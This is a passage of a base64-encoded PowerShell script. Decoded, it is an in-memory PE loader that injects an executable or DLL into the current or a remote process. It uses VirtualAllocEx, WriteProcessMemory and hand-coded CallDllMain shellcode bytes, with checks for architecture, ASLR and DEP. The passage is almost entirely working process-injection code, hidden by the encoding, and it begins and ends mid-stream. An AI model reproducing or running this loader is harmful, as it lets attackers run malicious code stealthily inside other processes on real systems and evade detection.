QUdFX0RMTENIQVJBQ1RFUklTVElDU19OWF9DT01QQVQpIC1uZSAkV2luMzJDb25zdGFudHMuSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05YX0NPTVBBVCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlBFIGlzIG5vdCBjb21wYXRpYmxlIHdpdGggREVQLCBtaWdodCBjYXVzZSBpc3N1ZXMiIC1XYXJuaW5nQWN0aW9uIENvbnRpbnVlCiAgICAgICAgICAgICROWENvbXBhdGlibGUgPSAkZmFsc2UKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI1ZlcmlmeSB0aGF0IHRoZSBQRSBhbmQgdGhlIGN1cnJlbnQgcHJvY2VzcyBhcmUgdGhlIHNhbWUgYml0cyAoMzJiaXQgb3IgNjRiaXQpCiAgICAgICAgJFByb2Nlc3M2NEJpdCA9ICR0cnVlCiAgICAgICAgaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJrZXJuZWwzMi5kbGwiKQogICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJJc1dvdzY0UHJvY2VzcyIpCiAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkNvdWxkbid0IGxvY2F0ZSBJc1dvdzY0UHJvY2VzcyBmdW5jdGlvbiB0byBkZXRlcm1pbmUgaWYgdGFyZ2V0IHByb2Nlc3MgaXMgMzJiaXQgb3IgNjRiaXQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIFtCb29sXSRXb3c2NFByb2Nlc3MgPSAkZmFsc2UKICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuSXNXb3c2NFByb2Nlc3MuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbUmVmXSRXb3c2NFByb2Nlc3MpCiAgICAgICAgICAgIGlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiQ2FsbCB0byBJc1dvdzY0UHJvY2VzcyBmYWlsZWQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgoJFdvdzY0UHJvY2VzcyAtZXEgJHRydWUpIC1vciAoKCRXb3c2NFByb2Nlc3MgLWVxICRmYWxzZSkgLWFuZCAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtZXEgNCkpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUHJvY2VzczY0Qml0ID0gJGZhbHNlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICNQb3dlclNoZWxsIG5lZWRzIHRvIGJlIHNhbWUgYml0IGFzIHRoZSBQRSBiZWluZyBsb2FkZWQgZm9yIEludFB0ciB0byB3b3JrIGNvcnJlY3RseQogICAgICAgICAgICAkUG93ZXJTaGVsbDY0Qml0ID0gJHRydWUKICAgICAgICAgICAgaWYgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLW5lIDgpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRQb3dlclNoZWxsNjRCaXQgPSAkZmFsc2UKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBvd2VyU2hlbGw2NEJpdCAtbmUgJFByb2Nlc3M2NEJpdCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdGhyb3cgIlBvd2VyU2hlbGwgbXVzdCBiZSBzYW1lIGFyY2hpdGVjdHVyZSAoeDg2L3g2NCkgYXMgUEUgYmVpbmcgbG9hZGVkIGFuZCByZW1vdGUgcHJvY2VzcyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZiAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtbmUgOCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFByb2Nlc3M2NEJpdCA9ICRmYWxzZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkUHJvY2VzczY0Qml0IC1uZSAkUEVJbmZvLlBFNjRCaXQpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiUEUgcGxhdGZvcm0gZG9lc24ndCBtYXRjaCB0aGUgYXJjaGl0ZWN0dXJlIG9mIHRoZSBwcm9jZXNzIGl0IGlzIGJlaW5nIGxvYWRlZCBpbiAoMzIvNjRiaXQpIgogICAgICAgIH0KICAgICAgICAKCiAgICAgICAgI0FsbG9jYXRlIG1lbW9yeSBhbmQgd3JpdGUgdGhlIFBFIHRvIG1lbW9yeS4gSWYgdGhlIFBFIHN1cHBvcnRzIEFTTFIsIGFsbG9jYXRlIHRvIGEgcmFuZG9tIG1lbW9yeSBhZGRyZXNzCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiQWxsb2NhdGluZyBtZW1vcnkgZm9yIHRoZSBQRSBhbmQgd3JpdGUgaXRzIGhlYWRlcnMgdG8gbWVtb3J5IgogICAgICAgIAogICAgICAgICNBU0xSIGNoZWNrCiAgICAgICAgW0ludFB0cl0kTG9hZEFkZHIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICRQRVN1cHBvcnRzQVNMUiA9ICgkUEVJbmZvLkRsbENoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX0RZTkFNSUNfQkFTRSkgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfRFlOQU1JQ19CQVNFCiAgICAgICAgaWYgKCgtbm90ICRGb3JjZUFTTFIpIC1hbmQgKC1ub3QgJFBFU3VwcG9ydHNBU0xSKSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlBFIGZpbGUgYmVpbmcgcmVmbGVjdGl2ZWx5IGxvYWRlZCBpcyBub3QgQVNMUiBjb21wYXRpYmxlLiBJZiB0aGUgbG9hZGluZyBmYWlscywgdHJ5IHJlc3RhcnRpbmcgUG93ZXJTaGVsbCBhbmQgdHJ5aW5nIGFnYWluIE9SIHRyeSB1c2luZyB0aGUgLUZvcmNlQVNMUiBmbGFnIChjb3VsZCBjYXVzZSBjcmFzaGVzKSIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKICAgICAgICAgICAgW0ludFB0cl0kTG9hZEFkZHIgPSAkT3JpZ2luYWxJbWFnZUJhc2UKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkRm9yY2VBU0xSIC1hbmQgKC1ub3QgJFBFU3VwcG9ydHNBU0xSKSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlBFIGZpbGUgZG9lc24ndCBzdXBwb3J0IEFTTFIgYnV0IC1Gb3JjZUFTTFIgaXMgc2V0LiBGb3JjaW5nIEFTTFIgb24gdGhlIFBFIGZpbGUuIFRoaXMgY291bGQgcmVzdWx0IGluIGEgY3Jhc2guIgogICAgICAgIH0KCiAgICAgICAgaWYgKCRGb3JjZUFTTFIgLWFuZCAkUmVtb3RlTG9hZGluZykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJDYW5ub3QgdXNlIEZvcmNlQVNMUiB3aGVuIGxvYWRpbmcgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcy4iIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgfQogICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtYW5kICgtbm90ICRQRVN1cHBvcnRzQVNMUikpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1FcnJvciAiUEUgZG9lc24ndCBzdXBwb3J0IEFTTFIuIENhbm5vdCBsb2FkIGEgbm9uLUFTTFIgUEUgaW4gdG8gYSByZW1vdGUgcHJvY2VzcyIgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICB9CgogICAgICAgICRQRUhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvICAgICAgICAgICAgICAjVGhpcyBpcyB3aGVyZSB0aGUgUEUgaXMgYWxsb2NhdGVkIGluIFBvd2VyU2hlbGwKICAgICAgICAkRWZmZWN0aXZlUEVIYW5kbGUgPSBbSW50UHRyXTo6WmVybyAgICAgI1RoaXMgaXMgdGhlIGFkZHJlc3MgdGhlIFBFIHdpbGwgYmUgbG9hZGVkIHRvLiBJZiBpdCBpcyBsb2FkZWQgaW4gUG93ZXJTaGVsbCwgdGhpcyBlcXVhbHMgJFBFSGFuZGxlLiBJZiBpdCBpcyBsb2FkZWQgaW4gYSByZW1vdGUgcHJvY2VzcywgdGhpcyBpcyB0aGUgYWRkcmVzcyBpbiB0aGUgcmVtb3RlIHByb2Nlc3MuCiAgICAgICAgaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICNBbGxvY2F0ZSBzcGFjZSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MsIGFuZCBhbHNvIGFsbG9jYXRlIHNwYWNlIGluIFBvd2VyU2hlbGwuIFRoZSBQRSB3aWxsIGJlIHNldHVwIGluIFBvd2VyU2hlbGwgYW5kIGNvcGllZCB0byB0aGUgcmVtb3RlIHByb2Nlc3Mgd2hlbiBpdCBpcyBzZXR1cAogICAgICAgICAgICAkUEVIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jLkludm9rZShbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSkKICAgICAgICAgICAgCiAgICAgICAgICAgICN0b2RvLCBlcnJvciBoYW5kbGluZyBuZWVkcyB0byBkZWxldGUgdGhpcyBtZW1vcnkgaWYgYW4gZXJyb3IgaGFwcGVucyBhbG9uZyB0aGUgd2F5CiAgICAgICAgICAgICRFZmZlY3RpdmVQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRMb2FkQWRkciwgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQogICAgICAgICAgICBpZiAoJEVmZmVjdGl2ZVBFSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzLiBJZiB0aGUgUEUgYmVpbmcgbG9hZGVkIGRvZXNuJ3Qgc3VwcG9ydCBBU0xSLCBpdCBjb3VsZCBiZSB0aGF0IHRoZSByZXF1ZXN0ZWQgYmFzZSBhZGRyZXNzIG9mIHRoZSBQRSBpcyBhbHJlYWR5IGluIHVzZSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZiAoJE5YQ29tcGF0aWJsZSAtZXEgJHRydWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2MuSW52b2tlKCRMb2FkQWRkciwgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2MuSW52b2tlKCRMb2FkQWRkciwgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQogICAgICAgICAgICB9CiAgICAgICAgICAgICRFZmZlY3RpdmVQRUhhbmRsZSA9ICRQRUhhbmRsZQogICAgICAgIH0KICAgICAgICAKICAgICAgICBbSW50UHRyXSRQRUVuZEFkZHJlc3MgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoW0ludDY0XSRQRUluZm8uU2l6ZU9mSW1hZ2UpCiAgICAgICAgaWYgKCRQRUhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgeyAKICAgICAgICAgICAgVGhyb3cgIlZpcnR1YWxBbGxvYyBmYWlsZWQgdG8gYWxsb2NhdGUgbWVtb3J5IGZvciBQRS4gSWYgUEUgaXMgbm90IEFTTFIgY29tcGF0aWJsZSwgdHJ5IHJ1bm5pbmcgdGhlIHNjcmlwdCBpbiBhIG5ldyBQb3dlclNoZWxsIHByb2Nlc3MgKHRoZSBuZXcgUG93ZXJTaGVsbCBwcm9jZXNzIHdpbGwgaGF2ZSBhIGRpZmZlcmVudCBtZW1vcnkgbGF5b3V0LCBzbyB0aGUgYWRkcmVzcyB0aGUgUEUgd2FudHMgbWlnaHQgYmUgZnJlZSkuIgogICAgICAgIH0gICAgICAgCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkUEVCeXRlcywgMCwgJFBFSGFuZGxlLCAkUEVJbmZvLlNpemVPZkhlYWRlcnMpIHwgT3V0LU51bGwKICAgICAgICAKICAgICAgICAKICAgICAgICAjTm93IHRoYXQgdGhlIFBFIGlzIGluIG1lbW9yeSwgZ2V0IG1vcmUgZGV0YWlsZWQgaW5mb3JtYXRpb24gYWJvdXQgaXQKICAgICAgICBXcml0ZS1WZXJib3NlICJHZXR0aW5nIGRldGFpbGVkIFBFIGluZm9ybWF0aW9uIGZyb20gdGhlIGhlYWRlcnMgbG9hZGVkIGluIG1lbW9yeSIKICAgICAgICAkUEVJbmZvID0gR2V0LVBFRGV0YWlsZWRJbmZvIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBFbmRBZGRyZXNzIC1WYWx1ZSAkUEVFbmRBZGRyZXNzCiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEVmZmVjdGl2ZVBFSGFuZGxlIC1WYWx1ZSAkRWZmZWN0aXZlUEVIYW5kbGUKICAgICAgICBXcml0ZS1WZXJib3NlICJTdGFydEFkZHJlc3M6ICQoR2V0LUhleCAkUEVIYW5kbGUpICAgIEVuZEFkZHJlc3M6ICQoR2V0LUhleCAkUEVFbmRBZGRyZXNzKSIKICAgICAgICAKICAgICAgICAKICAgICAgICAjQ29weSBlYWNoIHNlY3Rpb24gZnJvbSB0aGUgUEUgaW4gdG8gbWVtb3J5CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ29weSBQRSBzZWN0aW9ucyBpbiB0byBtZW1vcnkiCiAgICAgICAgQ29weS1TZWN0aW9ucyAtUEVCeXRlcyAkUEVCeXRlcyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcwogICAgICAgIAogICAgICAgIAogICAgICAgICNVcGRhdGUgdGhlIG1lbW9yeSBhZGRyZXNzZXMgaGFyZGNvZGVkIGluIHRvIHRoZSBQRSBiYXNlZCBvbiB0aGUgbWVtb3J5IGFkZHJlc3MgdGhlIFBFIHdhcyBleHBlY3RpbmcgdG8gYmUgbG9hZGVkIHRvIHZzIHdoZXJlIGl0IHdhcyBhY3R1YWxseSBsb2FkZWQKICAgICAgICBXcml0ZS1WZXJib3NlICJVcGRhdGUgbWVtb3J5IGFkZHJlc3NlcyBiYXNlZCBvbiB3aGVyZSB0aGUgUEUgd2FzIGFjdHVhbGx5IGxvYWRlZCBpbiBtZW1vcnkiCiAgICAgICAgVXBkYXRlLU1lbW9yeUFkZHJlc3NlcyAtUEVJbmZvICRQRUluZm8gLU9yaWdpbmFsSW1hZ2VCYXNlICRPcmlnaW5hbEltYWdlQmFzZSAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCgogICAgICAgIAogICAgICAgICNUaGUgUEUgd2UgYXJlIGluLW1lbW9yeSBsb2FkaW5nIGhhcyBETExzIGl0IG5lZWRzLCBpbXBvcnQgdGhvc2UgRExMcyBmb3IgaXQKICAgICAgICBXcml0ZS1WZXJib3NlICJJbXBvcnQgRExMJ3MgbmVlZGVkIGJ5IHRoZSBQRSB3ZSBhcmUgbG9hZGluZyIKICAgICAgICBpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgSW1wb3J0LURsbEltcG9ydHMgLVBFSW5mbyAkUEVJbmZvIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cyAtUmVtb3RlUHJvY0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBJbXBvcnQtRGxsSW1wb3J0cyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCiAgICAgICAgfQogICAgICAgIAogICAgICAgIAogICAgICAgICNVcGRhdGUgdGhlIG1lbW9yeSBwcm90ZWN0aW9uIGZsYWdzIGZvciBhbGwgdGhlIG1lbW9yeSBqdXN0IGFsbG9jYXRlZAogICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtZXEgJGZhbHNlKQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCROWENvbXBhdGlibGUgLWVxICR0cnVlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJVcGRhdGUgbWVtb3J5IHByb3RlY3Rpb24gZmxhZ3MiCiAgICAgICAgICAgICAgICBVcGRhdGUtTWVtb3J5UHJvdGVjdGlvbkZsYWdzIC1QRUluZm8gJFBFSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlBFIGJlaW5nIHJlZmxlY3RpdmVseSBsb2FkZWQgaXMgbm90IGNvbXBhdGlibGUgd2l0aCBOWCBtZW1vcnksIGtlZXBpbmcgbWVtb3J5IGFzIHJlYWQgd3JpdGUgZXhlY3V0ZSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJQRSBiZWluZyBsb2FkZWQgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcywgbm90IGFkanVzdGluZyBtZW1vcnkgcGVybWlzc2lvbnMiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIAogICAgICAgICNJZiByZW1vdGUgbG9hZGluZywgY29weSB0aGUgRExMIGluIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeQogICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICBbVUludDMyXSROdW1CeXRlc1dyaXR0ZW4gPSAwCiAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRFZmZlY3RpdmVQRUhhbmRsZSwgJFBFSGFuZGxlLCBbVUludFB0cl0oJFBFSW5mby5TaXplT2ZJbWFnZSksIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI0NhbGwgdGhlIGVudHJ5IHBvaW50LCBpZiB0aGlzIGlzIGEgRExMIHRoZSBlbnRyeXBvaW50IGlzIHRoZSBEbGxNYWluIGZ1bmN0aW9uLCBpZiBpdCBpcyBhbiBFWEUgaXQgaXMgdGhlIE1haW4gZnVuY3Rpb24KICAgICAgICBpZiAoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJETEwiKQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZGxsbWFpbiBzbyB0aGUgRExMIGtub3dzIGl0IGhhcyBiZWVuIGxvYWRlZCIKICAgICAgICAgICAgICAgICREbGxNYWluUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQWRkcmVzc09mRW50cnlQb2ludCkKICAgICAgICAgICAgICAgICREbGxNYWluRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtCb29sXSkKICAgICAgICAgICAgICAgICREbGxNYWluID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJERsbE1haW5QdHIsICREbGxNYWluRGVsZWdhdGUpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICREbGxNYWluLkludm9rZSgkUEVJbmZvLlBFSGFuZGxlLCAxLCBbSW50UHRyXTo6WmVybykgfCBPdXQtTnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJERsbE1haW5QdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJEVmZmVjdGl2ZVBFSGFuZGxlKSAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkFkZHJlc3NPZkVudHJ5UG9pbnQpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgI1NoZWxsY29kZTogQ2FsbERsbE1haW4uYXNtCiAgICAgICAgICAgICAgICAgICAgJENhbGxEbGxNYWluU0MxID0gQCgweDUzLCAweDQ4LCAweDg5LCAweGUzLCAweDY2LCAweDgzLCAweGU0LCAweDAwLCAweDQ4LCAweGI5KQogICAgICAgICAgICAgICAgICAgICRDYWxsRGxsTWFpblNDMiA9IEAoMHhiYSwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0MSwgMHhiOCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0OCwgMHhiOCkKICAgICAgICAgICAgICAgICAgICAkQ2FsbERsbE1haW5TQzMgPSBAKDB4ZmYsIDB4ZDAsIDB4NDgsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgI1NoZWxsY29kZTogQ2FsbERsbE1haW4uYXNtCiAgICAgICAgICAgICAgICAgICAgJENhbGxEbGxNYWluU0MxID0gQCgweDUzLCAweDg5LCAweGUzLCAweDgzLCAweGU0LCAweGYwLCAweGI5KQogICAgICAgICAgICAgICAgICAgICRDYWxsRGxsTWFpblNDMiA9IEAoMHhiYSwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHhiOCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg1MCwgMHg1MiwgMHg1MSwgMHhiOCkKICAgICAgICAgICAgICAgICAgICAkQ2FsbERsbE1haW5TQzMgPSBAKDB4ZmYsIDB4ZDAsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkU0NMZW5ndGggPSAkQ2FsbERsbE1haW5TQzEuTGVuZ3RoICsgJENhbGxEbGxNYWluU0MyLkxlbmd0aCArICRDYWxsRGxsTWFpblNDMy5MZW5ndGggKyAoJFB0clNpemUgKiAyKQogICAgICAgICAgICAgICAgJFNDUFNNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFNDTGVuZ3RoKQogICAgICAgICAgICAgICAgJFNDUFNNZW1PcmlnaW5hbCA9ICRTQ1BTTWVtCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRDYWxsRGxsTWFpblNDMSAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQogICAgICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJENhbGxEbGxNYWluU0MxLkxlbmd0aCkKICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRFZmZlY3RpdmVQRUhhbmRsZSwgJFNDUFNNZW0sICRmYWxzZSkKICAgICAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQogICAgICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJENhbGxEbGxNYWluU0MyIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkQ2FsbERsbE1haW5TQzIuTGVuZ3RoKQogICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJERsbE1haW5QdHIsICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKICAgICAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRDYWxsRGxsTWFpblNDMyAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQogICAgICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJENhbGxEbGxNYWluU0MzLkxlbmd0aCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFJTQ0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW